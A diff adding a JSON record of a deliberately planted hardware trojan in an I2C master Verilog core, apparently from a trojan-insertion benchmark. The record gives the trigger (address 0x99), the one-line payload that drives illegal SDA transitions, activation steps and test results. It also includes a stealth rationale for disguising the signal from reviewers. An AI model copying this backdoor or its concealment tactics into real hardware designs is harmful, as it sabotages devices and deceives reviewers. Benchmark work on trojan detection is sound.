@@ -1,0 +1,62 @@
+{
+  "design": "i2c",
+  "category": "cat7_protocol_violation",
+  "target_file": "i2c_master_bit_ctrl.v",
+  "target_module": "i2c_master_bit_ctrl",
+  "new_signals": [
+    {
+      "name": "byte_cal",
+      "type": "wire",
+      "width": 1,
+      "comment_in_source": "write-phase calibration check, reused for SDA hold-time bookkeeping"
+    }
+  ],
+  "trigger_condition": {
+    "expression": "byte_cal = (slave_adr == 8'h99)",
+    "checked_at": "the wr_c sub-state of the bit-controller's WRITE bit-generation state machine -- the one state where the clean design itself comments \"keep SCL high\" and uses this exact window (via its own sda_chk signal) to self-check for multi-master arbitration loss",
+    "inputs_used": [
+      {
+        "name": "slave_adr",
+        "pre_existing": true,
+        "description": "existing 8-bit register in i2c_master_bit_ctrl that passively snoops any START+8-bits sequence observed on the bus (reused exactly as in the cat3 submission for this design)"
+      }
+    ],
+    "magic_value": "8'h99",
+    "magic_value_derivation": "deliberately an ODD byte: the low (R/W) bit of any snooped WRITE-phase address byte is always 0, so 8'h99 can only ever arise from a READ-phase address snoop (R/W=1) -- specifically 7-bit address 0x4C, giving {0x4C,1}=8'h99 -- confirmed not to collide with any address byte the design's own golden testbench ever produces (golden SADR=0x10 gives write/read-phase bytes 0x20/0x21 only)"
+  },
+  "payload": {
+    "location": "wr_c case arm of i2c_master_bit_ctrl's main state machine (the SDA output-enable register load for the SCL-high \"hold\" sub-state of a WRITE bit)",
+    "clean_behavior": "sda_oen_master <= din;",
+    "infected_behavior": "sda_oen_master <= byte_cal ? ~din : din;",
+    "description": "when slave_adr==8'h99, the bit controller drives SDA to the COMPLEMENT of the bit actually being transmitted during wr_c, instead of the real bit -- while SCL is being deliberately held high. Per the I2C specification, ANY SDA transition while SCL is high outside of a deliberate START/STOP sequence is itself indistinguishable from a START (1->0) or STOP (0->1) condition to every other device on the bus. This is a true physical-layer protocol violation, not a data-corruption trojan: the byte latched into the local shift register for the core's own bookkeeping is unaffected; what is corrupted is the legality of the waveform any other bus listener observes. Because slave_adr (not a per-bit counter) gates the condition, it holds for the entire byte, so every bit of a triggered WRITE data byte independently glitches during its own wr_c window, not just one bit."
+  },
+  "activation_requirements": {
+    "top_level_interface": "the real top-level scl_pad_o / sda_pad_o (and loopback scl_pad_i / sda_pad_i) pins of i2c_master_top, observed with a pure pin-level SDA-transition-while-SCL-high counter; no internal/hierarchical probing of either DUT",
+    "procedure": [
+      "program PRER=0x00C8, CTR=0x80 (enable core)",
+      "issue a START with the address byte {7'h4C, RD}=8'h99 -- this snoops slave_adr=8'h99 via the design's own existing passive address-snoop logic",
+      "immediately issue a WRITE command (at the raw Wishbone command-register level, which any real driver is free to do) instead of a READ -- slave_adr is still 8'h99 while this WRITE byte's bits are transmitted",
+      "count SDA transitions sampled while SCL already reads high across the whole checkpoint, on both the infected and a clean reference DUT given the identical stimulus",
+      "the infected DUT's count exceeds the clean DUT's count by one extra illegal transition per bit of the triggered byte; for ordinary traffic (no trigger), the counts are identical on both DUTs (all legitimate START/STOP conditions, no extra glitch)"
+    ]
+  },
+  "one_shot_or_persistent": "re-arms every time the design re-enters the trigger condition; fires on every WRITE bit transmitted while slave_adr==8'h99 (i.e. for the duration of one triggered byte, since slave_adr itself does not change mid-byte), and is fully inactive the instant slave_adr changes away from 8'h99 (on the next snooped address byte) or no WRITE command is in progress",
+  "verification": {
+    "eval0_synthesis": {
+      "tool": "Yosys 0.33 + sky130_fd_sc_hd (tt_025C_1v80) liberty",
+      "result": "PASS",
+      "notes": "0 ERROR lines, full technology mapping of all three design files, top-module chip area 9930.7744 um^2"
+    },
+    "eval1_dormancy": {
+      "tool": "Icarus Verilog 12.0, unmodified golden tb_i2c_top.v",
+      "result": "PASS (SIMULATION PASSED)",
+      "notes": "the golden testbench only ever addresses SADR=0x10, producing snooped slave_adr values 0x20/0x21 (confirmed in the cat3 submission's probe work for this design) -- never the odd value 0x99 -- so the trigger never activates"
+    },
+    "eval2_activation": {
+      "tool": "Icarus Verilog 12.0, standalone dual-DUT activation testbench, counting real SDA-transitions-while-SCL-high on the top-level bus pins (a pure count comparison between infected and clean DUTs, since legitimate START/STOP conditions are themselves exactly this kind of transition and must not be mistaken for the trojan)",
+      "result": "PASS (TROJAN ACTIVATION CONFIRMED)",
+      "notes": "3 checkpoints: ordinary write-then-repeated-start-read traffic near-miss (identical count of 4 on both DUTs -- all legitimate START/STOP conditions), slave_adr=0x99 TRIGGER (infected=7 vs clean=4, three extra illegal transitions -- one per bit of the triggered WRITE byte whose complement actually changed the line level), slave_adr=0x9B near-miss (identical count of 4 on both DUTs, confirming an exact single-value match) -- 0 unexpected mismatches, 1 documented trigger confirmation"
+    }
+  },
+  "stealth_rationale": "the only new signal, byte_cal, is named and commented as ordinary write-phase calibration/hold-time bookkeeping with no trigger/trojan/violation terminology; the diff against the clean file is a 1-line wire declaration, a 2-line assign statement reusing the pre-existing slave_adr signal (already present and used for an unrelated purpose in the cat3 submission for this design), and a one-character-deep change to a single existing case arm (din -> byte_cal ? ~din : din) -- port list, parameters, and the module's instantiation inside i2c_master_byte_ctrl are all untouched; the payload sits inside the exact state (wr_c) the clean design itself already singles out as special (it is the one state that enables sda_chk, the design's own arbitration-loss self-check), so a reviewer skimming the state machine would see conditional logic in a place conditional logic is already expected"
+}
